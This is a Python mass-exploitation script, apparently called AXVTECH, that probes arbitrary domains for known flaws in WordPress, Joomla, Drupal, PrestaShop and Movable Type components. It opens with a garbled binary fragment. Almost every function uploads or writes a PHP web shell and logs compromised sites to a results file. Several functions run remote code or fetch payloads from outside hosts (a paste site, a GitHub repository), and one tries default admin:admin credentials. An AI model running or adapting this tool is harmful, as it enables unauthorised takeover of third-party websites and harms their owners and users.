e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9" + shell + "\r\n--------------------------66e3ca93281c7050--\r\n"
        headers_upEX12 = {'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': UserAgent().random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050",
                'referer': 'www.google.com'}
        requests.post(domainEX12, data=filedataEX12, headers=headers_upEX12, verify=False, timeout=20)
        newShellEX12 = domainEX12.replace("php/connector.minimal.php", f"files/{filenameEX12}")
        checkEX12 = requests.get(newShellEX12, headers=ua, verify=False, timeout=15).text
        if 'AXVTECH' in checkEX12:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}WfPFILEMANAGER -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(newShellEX12 + '\n')
        else:
            requests.get(domainEX12 + "?cmd=mkfile&name=axv.php&target=l1_Lw", headers=ua, verify=False, timeout=10).text
            filedataEX12 = {'cmd': 'put', 'target': 'l1_Zm94LnBocA', 'content': shell}
            requests.post(domainEX12, data=filedataEX12, headers=ua, verify=False, timeout=20)
            newShellEX12 = domainEX12.replace("php/connector.minimal.php", "files/axv.php")
            checksEX12 = requests.get(newShellEX12, headers=ua, verify=False, timeout=15).text
            if 'AXVTECH' in checksEX12:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}WfPFILEMANAGER -->> {green}Exploited !")
                open('results/ShellsExploit.txt', 'a+').write(newShellEX12 + '\n')
            else:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}WfPFILEMANAGER -->> {red}Not Vuln !")
    except:pass

def Gateway(domain):
    try:
        filesEX13 = {'filename': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        exploitEX13 = f'https://{domain}/wp-content/plugins/gatewayapi/inc/css_js.php'
        requests.post(exploitEX13, files=filesEX13, headers=ua, verify=False, timeout=20)
        shell_dirEX13 = f'http://{domain}/wp-content/plugins/gatewayapi/inc/axv.php'
        get_payloadEX13 = requests.get(shell_dirEX13, headers=ua, verify=False, timeout=10).text
        if 'AXVTECH' in get_payloadEX13:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gateway -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(shell_dirEX13 + '\n')
        else:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gateway -->> {red}Not Vuln !")
    except:pass
    
def Gateway2(domain):
    try:
        filesEX14 = {'et_pb_contact_file': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        exploitEX14 = f'https://{domain}/wp-content/plugins/divi-contact-extended/includes/upload.php'
        send_payloadEX14 = requests.post(exploitEX14, files=filesEX14, headers=ua, verify=False, timeout=20).text
        hsEX14 = re.findall('"file_uri":"(.*?)"', send_payloadEX14)[0]
        dEX14 = hsEX14.replace('\\', '')
        if 'AXVTECH' in send_payloadEX14:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gateway -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(dEX14 + '\n')
        else:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Gateway -->> {red}Not Vuln !")
    except:pass
    
    
def Phpunit(domain):
    try:
        chekPHPUNIT = requests.get(f"http://{domain}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", headers=ua, timeout=10, verify=False)
        if 'PHP License as published by the PHP Group' in chekPHPUNIT.text:
            requests.post(f"https://{domain}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", data='<?php copy("https://paste.myconan.net/483212.txt", "axvtech.php"); ?>;', headers=ua, timeout=20, verify=False)
            checkshellPHPUNIT = requests.get(f"http://{domain}/vendor/phpunit/phpunit/src/Util/PHP/axvtech.php", headers=ua, timeout=10, verify=False).text
            if "AXVTECH" in checkshellPHPUNIT:
                open("results/ShellsExploit.txt","a+").write(f"http://{domain}/vendor/phpunit/phpunit/src/Util/PHP/axvtech.php\n")
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUNIT -->> {green}Exploited !")
            else:pass
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHPUNIT -->> {red}Not Vuln !")
    except:pass
    
    
def Com_Xcloner(domain):
    try:
        expEXJom = f'{domain}/administrator/components/com_xcloner-backupandrestore/index2.php'
        check1EXJom  = requests.get('http://' + expEXJom , headers=ua, timeout=10, verify=False, allow_redirects=False)
        if 'Authentication Area:' in check1EXJom.text:
            data1EXJom  = {'username': 'admin','password': 'admin','option': 'com_cloner','task': 'dologin','boxchecked': 0,'hidemainmenu': 0}
            check2EXJom  = requests.post('https://' + expEXJom , headers=ua, data=data1EXJom , verify=False, timeout=20)
            if 'mosmsg=Welcome+to+XCloner+backend' in check2EXJom.text:
                data2EXJom  = {'def_content':shell,'option':'com_cloner','language':'english','task':'save_lang','boxchecked':0,'hidemainmenu':0}
                check3EXJom  = requests.post('https://' +  expEXJom , headers=ua, data=data2EXJom , verify=False, timeout=30)
                if 'successfully' in check3EXJom.text:
                    ktnshellEXJom  = f'http://{domain}/administrator/components/com_xcloner-backupandrestore/language/english.php'
                    check4EXJom  = requests.get(ktnshellEXJom , headers=ua, verify=False, timeout=10)
                    if 'AXVTECH' in check4EXJom.text:
                        open('results/ShellsExploit.txt', 'a+').write(ktnshellEXJom  + '\n')
                        print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com _XCloner Joomla -->> {green}Exploited !")
                    else:pass
                else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com _XCloner Joomla -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Com _XCloner Joomla -->> {red}Not Vuln !")
    except:pass
    
def CgiEx(domain):
    try: 
        dataCGIJP = """<?xml version="1.0"?>
        <methodCall>
        <methodName>mt.handler_to_coderef</methodName>
        <params>
        <param><value><base64>
        YGVjaG8gIlBEOXdhSEFnWldOb2J5QW5RVmhXVTBoRlRFd25MaWM4WW5JK0p5NG5WVzVoYldVNkp5NXdhSEJmZFc1aGJXVW9LUzRuUEdKeVBpY3VKR04zWkNBOUlHZGxkR04zWkNncE95QkZZMmh2SUNjOFkyVnVkR1Z5UGlBZ1BHWnZjbTBnYldWMGFHOWtQU0p3YjNOMElpQjBZWEpuWlhROUlsOXpaV3htSWlCbGJtTjBlWEJsUFNKdGRXeDBhWEJoY25RdlptOXliUzFrWVhSaElqNGdJRHhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJaUJ6YVhwbFBTSXlNQ0lnYm1GdFpUMGlkWEJzYjJGa2N5SWdMejRnUEdsdWNIVjBJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SW5Wd2JHOWhaQ0lnTHo0Z0lEd3ZabTl5YlQ0Z0lEd3ZZMlZ1ZEdWeVBqd3ZkR1ErUEM5MGNqNGdQQzkwWVdKc1pUNDhZbkkrSnpzZ2FXWWdLQ0ZsYlhCMGVTQW9KRjlHU1V4RlUxc25kWEJzYjJGa2N5ZGRLU2tnZXlBZ0lDQWdiVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1JmUmtsTVJWTmJKM1Z3Ykc5aFpITW5YVnNuZEcxd1gyNWhiV1VuWFN3a1gwWkpURVZUV3lkMWNHeHZZV1J6SjExYkoyNWhiV1VuWFNrN0lDQWdJQ0JGWTJodklDSThjMk55YVhCMFBtRnNaWEowS0NkMWNHeHZZV1FnUkc5dVpTY3BPeUFnSUNBZ0lDQWdQQzl6WTNKcGNIUStQR0krVlhCc2IyRmtaV1FnSVNFaFBDOWlQanhpY2o1dVlXMWxJRG9nSWk0a1gwWkpURVZUV3lkMWNHeHZZV1J6SjExYkoyNWhiV1VuWFM0aVBHSnlQbk5wZW1VZ09pQWlMaVJmUmtsTVJWTmJKM1Z3Ykc5aFpITW5YVnNuYzJsNlpTZGRMaUk4WW5JK2RIbHdaU0E2SUNJdUpGOUdTVXhGVTFzbmRYQnNiMkZrY3lkZFd5ZDBlWEJsSjEwN0lIMGdQejRpIiB8IGJhc2U2NCAtLWRlY29kZSA+PiBheHZzaGVsbHMucGhwYA==
        </base64></value></param>
        </params>
        </methodCall>"""
        cokCGIJP = requests.post(f'https://{domain}/mt/mt-xmlrpc.cgi', headers=ua, data=dataCGIJP, timeout=20, verify=False)
        if "MT::handler_to_coderef('mt', '`echo" in cokCGIJP.text or "MT::handler_to_coderef('mt', '`echo" in cokCGIJP.text:
            cekshellCGIJP = requests.get(f"http://{domain}/mt/axvshells.php", headers=ua, timeout=10, verify=False)
            if 'AXVSHELL' in cekshellCGIJP.text:
                print(f"{blue}|- {white}http://{domain} {white}| {yellow}CGI -->> {green}Exploited !")
                open('results/ShellsExploit.txt','a+').write(f"http://{domain}/mt/axvshells.php\n")
            else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CGI -->> {red}Failed Exploit !")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CGI -->> {red}Not Vuln !")
    except:pass

def Wpmbl(domain):
    try:
        urlwpmbl = f"http://{domain}/wp-content/plugins/wp-mobile-detector/resize.php?src=https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axvuploader.php"
        shellwpmbl = f"http://{domain}/wp-content/plugins/wp-mobile-detector/cache/upload.php"
        requests.get(urlwpmbl, headers=ua, timeout=20, verify=False)
        ckwpmbl = requests.get(shellwpmbl, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in ckwpmbl:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP-DETECTOR -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellwpmbl}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}WP-DETECTOR -->> {red}Not Vuln !")
    except:pass
    
def Jsr(domain):
    try:
        shelljsr = f'http://{domain}/wp-content/jssor-slider/jssor-uploads/axv.phtml'
        urljsr = f'https://{domain}/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library'
        filenamejsr = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.phtml','rb')
        filesjsr = {'file':filenamejsr}
        requests.post(urljsr, files=filesjsr, headers=ua, timeout=20, verify=False)
        okjsr = requests.get(shelljsr, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in okjsr:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}JSSOR-SLIDER -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shelljsr}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}JSSOR-SLIDER -->> {red}Not Vuln !")
    except:pass
    
def Sydney(domain):
    try:
        filenameSydney = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.jpg','rb')
        dataSydney = {"form_id" : "../../../",
                "name" : "axv.phtml",
                "gform_unique_id" : "../../",
                "field_id" : ""
                }
        filesSydney = {"file":filenameSydney}
        requests.post(f'https://{domain}/?gf_page=upload',files=filesSydney, data=dataSydney ,headers=ua, timeout=20, verify=False)
        shellSydney = f'http://{domain}/_input__axv.phtml'
        sydneyres = requests.get(shellSydney, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in sydneyres:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SYDNEY -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellSydney}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SYDNEY -->> {red}Not Vuln !")
    except:pass

def Facil(domain):
    try:
        linkfacil =  f'https://{domain}/components/com_facileforms/libraries/jquery/uploadify.php'
        filenamefacil = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesfacil = {'Filedata':filenamefacil}	
        shellfacil = f'http://{domain}/components/com_facileforms/libraries/jquery/axv.php'
        requests.post(linkfacil, files=filesfacil, headers=ua, timeout=20, verify=False)
        efacil = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in efacil:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}FACILEFORMS -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellfacil}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}FACILEFORMS -->> {red}Not Vuln !")
    except:pass
    
def Sfu(domain):
    try:
        linksfu = f'https://{domain}/modules/mod_simplefileuploadv1.3/elements/udd.php'
        filenamesfu = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filessfu = {'file':filenamesfu}
        shellsfu = f'http://{domain}/modules/mod_simplefileuploadv1.3/elements/axv.php'
        requests.post(linksfu, files=filessfu, headers=ua, timeout=20, verify=False)
        esfu = requests.get(shellsfu, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in esfu:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SIMPLE FILE UPLOADS -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellsfu}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SIMPLE FILE UPLOADS -->> {red}Not Vuln !")
    except:pass
    
def Levo(domain):
    try:
        linklevoslideshow = f'https://{domain}/wp-admin/admin.php?page=levoslideshow_manage'
        filenamelevoslideshow = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        fileslevoslideshow = {'album_img':filenamelevoslideshow}
        shelllevoslideshow = f'http://{domain}/wp-content/uploads/levoslideshow/1_uploadfolder/big/axv.php'
        requests.post(linklevoslideshow, files=fileslevoslideshow, headers=ua, timeout=20, verify=False)
        elevoslideshow = requests.get(shelllevoslideshow, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in elevoslideshow:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}LEVOSLIDESHOW -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shelllevoslideshow}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}LEVOSLIDESHOW -->> {red}Not Vuln !")
    except:pass
    
def Blaze(domain):
    try:
        linkblaze = f'https://{domain}/wp-admin/admin.php?page=blaze_manage'
        filenameblaze = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesblaze = {'album_img':filenameblaze}
        shellblaze = f'http://{domain}/wp-content/uploads/blaze/1_uploadfolder/big/axv.php'
        requests.post(linkblaze,files=filesblaze,headers=ua, timeout=20, verify=False)
        eblaze = requests.get(shell,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eblaze:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}BLAZE -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellblaze}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}BLAZE -->> {red}Not Vuln !")
    except:pass

def Catpro(domain):
    try:
        linkcatpro = f'https://{domain}/wp-admin/admin.php?page=catpro_manage'
        filenamecatpro = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filescatpro = {'album_img':filenamecatpro}
        shellcatpro = f'http://{domain}/wp-content/uploads/catpro/1_uploadfolder/big/axv.php'
        requests.post(linkcatpro, files=filescatpro, headers=ua, timeout=20, verify=False)
        ecatpro = requests.get(shellcatpro, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in ecatpro:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}CATPRO -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellcatpro}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}CATPRO -->> {red}Not Vuln !")
    except:pass

def Powerzommer(domain):
    try:
        linkpowerzoomer = f'https://{domain}/wp-admin/admin.php?page=powerzoomer_manage'
        filenamepowerzoomer = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filespowerzoomer = {'album_img':filenamepowerzoomer}
        shellpowerzoomer = f'http://{domain}/wp-content/uploads/powerzoomer/1_uploadfolder/big/axv.php'
        requests.post(linkpowerzoomer,files=filespowerzoomer,headers=ua, timeout=20, verify=False)
        epowerzoomer = requests.get(shell,headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in epowerzoomer.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}POWER-ZOOMER -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellpowerzoomer}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}POWER-ZOOMER -->> {red}Not Vuln !")
    except:pass
    
def Sam(domain):
    try:
        linksam = f'https://{domain}/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
        filenamesam = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filessam = {'uploadfile':filenamesam}
        shellsam = f'http://{domain}/wp-content/plugins/simple-ads-manager/axv.php'
        requests.post(linksam,files=filessam,headers=ua, timeout=20, verify=False)
        esam = requests.get(shellsam,headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in esam.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SIMPLE-ADS-MANAGER -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellsam}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SIMPLE-ADS-MANAGER -->> {red}Not Vuln !")
    except:pass
    
def Shp(domain):
    try:
        linkslideshowpro = f'https://{domain}/wp-admin/admin.php?page=slideshowpro_manage'
        filenameslideshowpro = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesslideshowpro = {'album_img':filenameslideshowpro}
        shellslideshowpro = f'http://{domain}/wp-content/uploads/slideshowpro/1_uploadfolder/big/axv.php'
        requests.post(linkslideshowpro,files=filesslideshowpro,headers=ua, timeout=20, verify=False)
        eslideshowpro = requests.get(shellslideshowpro,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eslideshowpro:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SLIDE-SHOW-PRO -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellslideshowpro}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SLIDE-SHOW-PRO -->> {red}Not Vuln !")
    except:pass
    
def Inboundio(domain):
    try:
        linkinboundio = f'https://{domain}/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php'
        filenameinboundio = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesinboundio = {'file':filenameinboundio}
        shellinboundio = f'http://{domain}/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/axv.php'
        requests.post(linkinboundio,files=filesinboundio,headers=ua, timeout=20, verify=False)
        einboundio = requests.get(shellinboundio,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in einboundio:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}INBOUNDIO -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellinboundio}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}INBOUNDIO -->> {red}Not Vuln !")
    except:pass
    
def SeCont(domain):
    try:
        linksexy = f'https://{domain}/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php'
        filenamesexy = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filessexy = {'files[]':filenamesexy}
        shellsexy = f'http://{domain}/wp-content/plugins/sexy-contact-form/includes/fileupload/files/axv.php'
        requests.post(linksexy, files=filessexy, headers=ua, timeout=20, verify=False)
        esexy = requests.get(shellsexy, headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in esexy:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}SEXY-CONTACT -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellsexy}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}SEXY-CONTACT -->> {red}Not Vuln !")
    except:pass

def Ffu(domain):
    try:
        linkffu = f'https://{domain}/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/'
        filenameffu = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesffu = {'files[]':filenameffu}
        shellffu = f'http://{domain}/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/axv.php'
        requests.post(linkffu,files=filesffu,headers=ua, timeout=20, verify=False)
        effu = requests.get(shellffu,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in effu:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}FLOW-FILE-UPLOAD -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellffu}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}FLOW-FILE-UPLOAD -->> {red}Not Vuln !")
    except:pass
    
def Pec(domain):
    try:
        linkpec = f'https://{domain}/wp-content/plugins/php-event-calendar/server/file-uploader/'
        filenamepec = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filespec = {'files[]':filenamepec}
        shellpec = f'http://{domain}/wp-content/plugins/php-event-calendar/server/file-uploader/axv.php'
        requests.post(linkpec,files=filespec,headers=ua, timeout=20, verify=False)
        epec = requests.get(shellpec,headers=ua, timeout=10, verify=False)
        if 'AXVTECH' in epec.text:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHP-EVENT-CALENDAR -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellpec}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}PHP-EVENT-CALENDAR -->> {red}Not Vuln !")
    except:pass
    
    
def Avatars(domain):
    try:
        linkavatars = f'https://{domain}/wp-content/themes/synoptic/lib/avatarupload/upload.php'
        filenameavatars = open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php','rb')
        filesavatars = {'qqfile':filenameavatars}
        shellavatars = f'http://{domain}/wp-content/uploads/markets/avatars/axv.php'
        requests.post(linkavatars,files=filesavatars,headers=ua, timeout=20, verify=False)
        eavatars = requests.get(shellavatars,headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in eavatars:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}AVATAR-UPLOAD -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{shellavatars}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}AVATAR-UPLOAD -->> {red}Not Vuln !")
    except:pass
    
def Fieldv(domain):
    try:
        inkfieldv = f'https://{domain}/modules/fieldvmegamenu/ajax/upload.php'
        filesfieldv = {'images[]': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(inkfieldv, files=filesfieldv, headers=ua, timeout=20, verify=False)
        checkfieldv = requests.get(f'http://{domain}/modules/fieldvmegamenu/uploads/axv.php', headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in checkfieldv:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}fieldvmegamenu -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/modules/fieldvmegamenu/uploads/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}fieldvmegamenu -->> {red}Not Vuln !")
    except:pass
    
def Wg24(domain):
    try:
        inkwg24 = f'https://{domain}/modules/wg24themeadministration/wg24_ajax.php'
        datawg24 = {'data': 'bajatax','type': 'pattern_upload'}
        fileswg24 = {'bajatax': open('modules/0KemYggJIdGfpf5i42FN/shells/axv.php', 'rb')}
        requests.post(inkwg24, files=fileswg24,data=datawg24, headers=ua, timeout=20, verify=False)
        checkwg24 = requests.get(f'http://{domain}/modules/wg24themeadministration/img/upload/axv.php', headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in checkwg24:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}wg24themeadministratio -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/modules/wg24themeadministration/img/upload/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}wg24themeadministratio -->> {red}Not Vuln !")
    except:pass
    
def Drupalajax(domain):
    try:
        testDRu = f'https://{domain}/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        filesDRu = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> axv.php'}
        requests.post(testDRu, data=filesDRu, headers=ua, timeout=20, verify=False)
        rDRu = requests.get(f'http://{domain}/axv.php', headers=ua, timeout=10, verify=False).text
        if 'AXVTECH' in rDRu:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}DRUPAL-AJAX -->> {green}Exploited !")
            open('results/ShellsExploit.txt','a+').write(f"http://{domain}/axv.php\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}DRUPAL-AJAX -->> {red}Not Vuln !")
    except:pass
    
def Version7drupal(domain):
    try:
        data7drupal = "echo '<center><h1>AXV</h1></center>' > axv.htm;" \
                " echo '" + shell + "'> sites/default/files/axv.php;" \
                " echo '" + shell + "'> axv.php;" \
                " cd sites/default/files/;" \
                " echo 'AddType application/x-httpd-php .jpg' > .htaccess;" \
                " wget 'https://raw.githubusercontent.com/ZeusFtrOfc/BotZeus/main/axv.php'"
        param7drupal = {'q': 'user/password', 'name[#post_render][]': 'passthru', 'name[#markup]': data7drupal, 'name[#type]': 'markup'}
        files7drupal = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
        requests.post(f"https://{domain}", data=files7drupal, params=param7drupal, headers=ua, timeout=20, verify=False)
